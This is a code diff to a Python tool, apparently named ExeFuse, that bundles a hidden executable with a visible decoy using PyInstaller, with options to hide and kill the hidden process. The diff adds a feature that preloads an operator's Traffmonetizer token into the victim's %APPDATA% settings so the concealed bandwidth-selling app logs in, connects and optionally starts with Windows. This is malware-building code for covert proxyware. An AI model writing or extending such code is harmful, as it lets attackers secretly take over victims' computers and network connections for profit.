@@ -56,6 +56,21 @@ def _safe_name(name, fallback="ExeFuse_App"):
     return name or fallback
 
 
+def _mask_token(token):
+    """Che token khi ghi log - chi hien 4 ky tu dau + do dai."""
+    token = token or ""
+    if not token:
+        return "(không có)"
+    if len(token) <= 8:
+        return "*" * len(token)
+    return token[:4] + "*" * (len(token) - 8) + token[-4:]
+
+
+def _is_traffmonetizer(path):
+    """Kiem tra file an co phai Traffmonetizer (de bat auto-token)."""
+    return "traffmonetizer" in os.path.basename(path or "").lower()
+
+
 def _log(job, line=""):
     with _LOCK:
         log = job["log"]
@@ -115,22 +130,28 @@ def get_result(job_id):
 
 def start_job(workdir, hidden_src, visible_src, output_name,
               kill_hidden=True, hide_watch=True, icon_src=None,
-              hidden_label=None):
+              hidden_label=None, hidden_token="", tm_autorun=False):
     """Tao job build chay nguon (background thread).
 
     visible_src co the la None -> che do SOLO (chi nhung app an).
+    hidden_token khac rong + file an la Traffmonetizer -> bat auto-token
+    (launcher se ghi Token vao %APPDATA%\\traffmonetizer\\settings.json
+    truoc khi chay app -> tu dang nhap + tu ket noi).
     """
     if not pyinstaller_available():
         raise RuntimeError(
             "PyInstaller chưa được cài đặt. Hãy mở terminal và chạy: "
             "pip install pyinstaller"
         )
+    token = (hidden_token or "").strip().strip('"').strip("'")
+    preseed = bool(token) and _is_traffmonetizer(hidden_src)
     job_id, job = create_job()
     thread = threading.Thread(
         target=_build_worker,
         args=(job, workdir, hidden_src, visible_src, output_name,
               bool(kill_hidden), bool(hide_watch), icon_src,
-              hidden_label or os.path.basename(hidden_src)),
+              hidden_label or os.path.basename(hidden_src),
+              token, preseed, bool(tm_autorun)),
         daemon=True,
     )
     thread.start()
@@ -138,7 +159,8 @@ def start_job(workdir, hidden_src, visible_src, output_name,
 
 
 def _build_worker(job, workdir, hidden_src, visible_src, output_name,
-                  kill_hidden, hide_watch, icon_src, hidden_label):
+                  kill_hidden, hide_watch, icon_src, hidden_label,
+                  hidden_token, tm_preseed, tm_autorun):
     try:
         _update(job, status="building")
         out_name = _safe_name(output_name)
@@ -155,6 +177,9 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
             .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET if visible_src else "")
             .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
             .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
+            .replace("%%TM_PRESEED%%", "True" if tm_preseed else "False")
+            .replace("%%TM_TOKEN%%", hidden_token if tm_preseed else "")
+            .replace("%%TM_AUTORUN%%", "True" if tm_autorun else "False")
         )
         launcher_py = os.path.join(workdir, "launcher.py")
         with open(launcher_py, "w", encoding="utf-8") as f:
@@ -162,6 +187,14 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
         mode_text = "GHÉP ĐÔI (1 ẩn + 1 hiện)" if visible_src else "SOLO (chỉ app ẩn)"
         _log(job, "[ExeFuse] Đã sinh launcher.py — chế độ: %s" % mode_text)
         _log(job, "[ExeFuse] File ẨN:   %s" % hidden_label)
+        if tm_preseed:
+            _log(job, "[ExeFuse] AUTO-TOKEN: BẬT — Token %s sẽ được ghi vào "
+                 "%%APPDATA%%\\traffmonetizer\\settings.json trước khi chạy, "
+                 "app tự đăng nhập + tự kết nối (StartWithWindows=%s)"
+                 % (_mask_token(hidden_token), tm_autorun))
+        elif hidden_token:
+            _log(job, "[ExeFuse] AUTO-TOKEN: bỏ qua (token có nhưng file ẩn "
+                 "không phải Traffmonetizer)")
 
         # 2. Copy file upload voi ten asset co dinh
         hidden_asset = os.path.join(workdir, HIDDEN_ASSET)
